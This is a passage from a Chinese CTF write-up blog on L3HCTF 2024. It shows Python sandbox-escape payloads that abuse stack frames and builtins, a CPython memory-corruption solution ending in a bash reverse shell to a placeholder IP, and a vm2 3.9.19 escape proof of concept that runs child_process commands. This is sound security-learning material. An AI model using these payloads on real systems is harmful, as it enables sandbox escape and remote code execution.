a<span class="token operator">=</span><span class="token builtin">next</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token builtin">globals</span><span class="token operator">=</span>a<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>输出一下a的值确定一下</p>
<p><img src="/blog/2024/02/04/L3HCTF-2024/image-20240429013911666.png" alt="image-20240429013911666"></p>
<p>又因为设置了<code>&#123;&quot;__builtins__&quot;: None&#125;</code> ，所以不能直接通过<code>next()</code>函数去获取到栈帧，但可以通过for语句去获取</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">a<span class="token operator">=</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
a<span class="token operator">=</span><span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> a<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token builtin">globals</span><span class="token operator">=</span>a<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/02/04/L3HCTF-2024/image-20240429014001310.png" alt="image-20240429014001310"></p>
<p>于是就能逃逸出来了，接下来看一下剩下的条件：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">></span><span class="token number">1e5</span> <span class="token keyword">and</span> q<span class="token operator">></span><span class="token number">1e5</span> <span class="token keyword">and</span> p<span class="token operator">*</span>q<span class="token operator">==</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">"69...97863"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>p和q就是<code>factorization</code>的两个返回值，首先p和q都得大于100000，其次就是p和q的积为int(“69…97863”)，算法在5秒内实现基本上不可能</p>
<p>不过我们可以通过沙箱外的globals的<code>__builtins__</code>字段去修改int函数，实现绕过if语句</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fake_int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token number">100001</span> <span class="token operator">*</span> <span class="token number">100002</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后将沙箱外部的 int 函数修改为 fake_int 函数即可，<code>__</code>用<code>&quot;_&quot;</code>和+、*拼接代替即可</p>
<p>最终payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">factorization</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a<span class="token operator">=</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    a<span class="token operator">=</span><span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> a<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token builtin">globals</span><span class="token operator">=</span>a<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals
    builtin <span class="token operator">=</span> <span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">"_"</span> <span class="token operator">+</span> <span class="token string">"_builtins_"</span> <span class="token operator">+</span> <span class="token string">"_"</span><span class="token punctuation">]</span>
    
    <span class="token keyword">def</span> <span class="token function">fakeint</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>builtin<span class="token punctuation">.</span><span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token number">123123</span><span class="token operator">*</span><span class="token number">123123</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token number">123123</span>

    builtin<span class="token punctuation">.</span><span class="token builtin">int</span><span class="token operator">=</span>fakeint
    <span class="token keyword">return</span> <span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/02/04/L3HCTF-2024/image-20240429015112480.png" alt="image-20240429015112480"></p>
<h4 id="其它解"><a href="#其它解" class="headerlink" title="其它解"></a>其它解</h4><p>S1uM4i的：修改offset的处理，不能通过io交互，直接本地生成一个marshal数据，之后观察构造，replace处理，完全不懂</p>
<p>细节可以看：<a target="_blank" rel="noopener" href="https://zer0peach.github.io/2024/02/06/L3HCTF-WEB/#intractable-problem-revenge">https://zer0peach.github.io/2024/02/06/L3HCTF-WEB/#intractable-problem-revenge</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
g <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">,</span> gl<span class="token operator">:=</span>g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">)</span> <span class="token keyword">for</span> g <span class="token keyword">in</span> a<span class="token punctuation">)</span>
a<span class="token punctuation">.</span>append<span class="token punctuation">(</span>g<span class="token punctuation">)</span>
g<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>

b <span class="token operator">=</span> gl<span class="token punctuation">[</span><span class="token string">'_'</span> <span class="token string">'_builtins_'</span> <span class="token string">'_'</span><span class="token punctuation">]</span>

<span class="token builtin">object</span> <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token builtin">object</span>
<span class="token builtin">bytearray</span> <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token builtin">bytearray</span>
<span class="token builtin">id</span> <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token builtin">id</span>
<span class="token keyword">print</span> <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token keyword">print</span>
<span class="token builtin">bytes</span> <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token builtin">bytes</span>
<span class="token builtin">input</span> <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token builtin">input</span>
<span class="token builtin">len</span> <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token builtin">len</span>
<span class="token builtin">hex</span> <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token builtin">hex</span>

importer <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"loader"</span> <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>importer<span class="token punctuation">)</span>
marshal <span class="token operator">=</span> importer<span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"marshal"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">p64</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> addr<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span>

const_tuple <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>

fake_bytearray <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>
    p64<span class="token punctuation">(</span><span class="token number">0x41414141</span><span class="token punctuation">)</span>
    <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span><span class="token builtin">bytearray</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># ob_refcnt</span>
    <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x7FFFFFFFFFFFFFFF</span><span class="token punctuation">)</span>  <span class="token comment"># ob_type</span>
    <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># ob_size (INT64_MAX)</span>
    <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># ob_alloc (doesn't seem to really be used?)</span>
    <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># *ob_bytes (start at address 0)</span>
    <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># *ob_start (ditto)  # ob_exports (not really sure what this does)</span>
<span class="token punctuation">)</span>

fake_bytearray_ptr_addr <span class="token operator">=</span> <span class="token builtin">id</span><span class="token punctuation">(</span>fake_bytearray<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x20</span>
const_tuple_array_start <span class="token operator">=</span> <span class="token builtin">id</span><span class="token punctuation">(</span>const_tuple<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x18</span>
offset <span class="token operator">=</span> <span class="token punctuation">(</span>fake_bytearray_ptr_addr <span class="token operator">-</span> const_tuple_array_start<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">8</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Offset:"</span><span class="token punctuation">,</span> offset<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dummy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>

tt <span class="token operator">=</span> <span class="token string">b'e3000000000000000000000000000000000000000040000000f30a00000090aa90bb90cc64dd5300a9007202000000720200000072020000007202000000da00720300000000000000f300000000'</span>
<span class="token keyword">def</span> <span class="token function">i2h</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> b
    <span class="token keyword">return</span> b<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
tt <span class="token operator">=</span> tt<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b"aa"</span><span class="token punctuation">,</span> i2h<span class="token punctuation">(</span><span class="token punctuation">(</span>offset <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b"bb"</span><span class="token punctuation">,</span> i2h<span class="token punctuation">(</span><span class="token punctuation">(</span>offset <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b"cc"</span><span class="token punctuation">,</span> i2h<span class="token punctuation">(</span><span class="token punctuation">(</span>offset <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b"dd"</span><span class="token punctuation">,</span> i2h<span class="token punctuation">(</span><span class="token punctuation">(</span>offset <span class="token operator">>></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>tt<span class="token punctuation">)</span>
bs <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>tt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
co <span class="token operator">=</span> marshal<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>bs<span class="token punctuation">)</span>
b<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span>dummy<span class="token punctuation">,</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"code"</span> <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span> co<span class="token punctuation">)</span>
magic <span class="token operator">=</span> dummy<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># sanity check</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>magic<span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">(</span><span class="token string">"peko"</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token builtin">id</span><span class="token punctuation">(</span><span class="token string">"peko"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

target_strs <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"import"</span><span class="token punctuation">,</span>
    <span class="token string">"spawn"</span><span class="token punctuation">,</span>
    <span class="token string">"process"</span><span class="token punctuation">,</span>
    <span class="token string">"os"</span><span class="token punctuation">,</span>
    <span class="token string">"sys"</span><span class="token punctuation">,</span>
    <span class="token string">"cpython"</span><span class="token punctuation">,</span>
    <span class="token string">"fork"</span><span class="token punctuation">,</span>
    <span class="token string">"open"</span><span class="token punctuation">,</span>
    <span class="token string">"interpreter"</span><span class="token punctuation">,</span>
    <span class="token string">"ctypes"</span><span class="token punctuation">,</span>
    <span class="token string">"compile"</span><span class="token punctuation">,</span>
    <span class="token string">"gc"</span><span class="token punctuation">,</span>
    <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"new"</span> <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span>
<span class="token keyword">for</span> s <span class="token keyword">in</span> target_strs<span class="token punctuation">:</span>
    addr <span class="token operator">=</span> <span class="token builtin">id</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
    magic<span class="token punctuation">[</span>addr <span class="token operator">+</span> <span class="token number">48</span> <span class="token punctuation">:</span> addr <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>

os <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"import"</span> <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'bash -c "bash -i >&amp; /dev/tcp/xxx.xxx.xxx.xxx/1234 0>&amp;1"'</span><span class="token punctuation">)</span>

factorization <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>还有一种解法：利用ctypes库实现内存的任意读写，替换<strong>内存中字符串指向的值</strong>，从而替换掉最终进行校验的数值</p>
<p>注意import在此题中因为os和open无法使用，可以通过<code>__loader__.load_module</code>进行加载，同时PyASCIIObject的头部长度为48，我们需要对有效负载进行改写</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">factorization</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a<span class="token operator">=</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    a<span class="token operator">=</span><span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> a<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token builtin">globals</span><span class="token operator">=</span>a<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals
    builtin<span class="token operator">=</span><span class="token string">"_"</span> <span class="token operator">+</span> <span class="token string">"_builtins_"</span> <span class="token operator">+</span> <span class="token string">"_"</span>
    builtin<span class="token operator">=</span><span class="token builtin">globals</span><span class="token punctuation">[</span>builtin<span class="token punctuation">]</span>
    ctypes<span class="token operator">=</span>builtin<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>builtin<span class="token punctuation">,</span> <span class="token string">"_"</span> <span class="token operator">+</span> <span class="token string">"_loader_"</span> <span class="token operator">+</span> <span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">"ctypes"</span><span class="token punctuation">)</span>
    <span class="token builtin">id</span><span class="token operator">=</span>builtin<span class="token punctuation">.</span><span class="token builtin">id</span>
    <span class="token builtin">ord</span><span class="token operator">=</span>builtin<span class="token punctuation">.</span><span class="token builtin">ord</span>
    
    <span class="token keyword">def</span> <span class="token function">writemem</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>
        p<span class="token operator">=</span>ctypes<span class="token punctuation">.</span>pointer<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>pointer<span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>c_char<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>contents<span class="token operator">=</span>ctypes<span class="token punctuation">.</span>c_longlong<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>contents<span class="token punctuation">.</span>contents<span class="token punctuation">.</span>value<span class="token operator">=</span>value
    addr<span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
    res<span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">*</span><span class="token number">1232</span>
    point<span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>
        writemem<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">48</span><span class="token operator">+</span>point<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
        point<span class="token operator">+=</span><span class="token number">1</span>
    <span class="token keyword">return</span> <span class="token number">10</span><span class="token operator">**</span><span class="token number">616</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token operator">**</span><span class="token number">616</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>另有其他多种解法，如获取到内存对象后查找内存确定输出标识符位置、通过上述方法篡改hook函数中字符串绕过hook、通过inspect读栈帧代码输出正确字符串等方式</p>
<p>不过最根本的思路都是利用栈帧沙盒逃逸获取globals</p>
<hr>
<h2 id="escape-web-复现"><a href="#escape-web-复现" class="headerlink" title="escape-web (复现)"></a>escape-web (复现)</h2><blockquote>
<p>vm2 3.9.19沙盒逃逸</p>
</blockquote>
<p>热乎的洞：<a target="_blank" rel="noopener" href="https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9">https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9</a></p>
<p>一个vm2 js沙盒</p>
<p>自己做的时候用了一点没啥用的命令，随便记一下（</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>process<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>global<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>global<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>poc：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span><span class="token constant">VM</span><span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> code <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
async function fn() &#123;
    (function stack() &#123;
        new Error().stack;
        stack();
    &#125;)();
&#125;
p = fn();
p.constructor = &#123;
    [Symbol.species]: class FakePromise &#123;
        constructor(executor) &#123;
            executor(
                (x) => x,
                (err) => &#123; return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch pwned'); &#125;
            )
        &#125;
    &#125;
&#125;;
p.then();
</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>题目环境不出网，直接写入文件带外</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /flag <span class="token operator">></span> /app/output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="short-url-复现"><a href="#short-url-复现" class="headerlink" title="short url (复现)"></a>short url (复现)</h2><blockquote>
<p>url解析</p>
</blockquote>
<p>给了一个生成短链接功能的页面，附件给了jar包，是springboot服务</p>
<p>DemoApplication.class</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ResponseEntity<span class="token punctuation">.</span>BodyBuilder</span><span class="token punctuation">)</span><span class="token class-name">ResponseEntity</span><span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token class-name">HttpStatus</span><span class="token punctuation">.</span><span class="token constant">FOUND</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">location</span><span class="token punctuation">(</span><span class="token constant">URI</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token string">"/index.html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token string">"redirect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/share"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">share</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token class-name">String</span> link<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      <span class="token class-name">UriComponents</span> uri <span class="token operator">=</span> <span class="token class-name">UriComponentsBuilder</span><span class="token punctuation">.</span><span class="token function">fromUriString</span><span class="token punctuation">(</span>link<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token class-name">String</span> protocal <span class="token operator">=</span> uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>protocal<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
         <span class="token keyword">return</span> <span class="token string">"url is invalid"</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
         <span class="token class-name">String</span> shortURL <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GetShortURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token class-name">CacheMap</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>shortURL<span class="token punctuation">,</span> link<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">return</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>RedirectURL</span> <span class="token operator">+</span> shortURL<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var5<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token string">"server error"</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/jump"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
